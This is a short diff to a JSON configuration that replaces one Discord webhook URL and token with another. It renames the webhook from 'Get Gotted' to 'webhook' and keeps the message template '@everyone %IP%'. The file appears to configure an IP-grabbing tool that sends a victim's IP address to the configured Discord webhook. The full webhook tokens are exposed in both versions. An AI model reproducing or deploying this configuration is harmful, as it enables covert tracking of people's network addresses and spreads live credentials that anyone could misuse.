@@ -1,6 +1,6 @@
 {
-  "webhook": "https://discord.com/api/webhooks/1208420562746220635/mqDyfnhidPnP0ZBItyz9e89aAlF58RsWO558BajRY5UYkwLiykglAY1dfkOuLf9U80Tn",
-  "webhook_name": "Get Gotted",
+  "webhook": "https://discord.com/api/webhooks/1208535035783938068/3bxy91a3Y2-0hT4dl_ujx0hTmGSoS3sJMolxJq_k5lc5AlQcy9obrzb5SVKSAcuc1mBw",
+  "webhook_name": "webhook",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
 
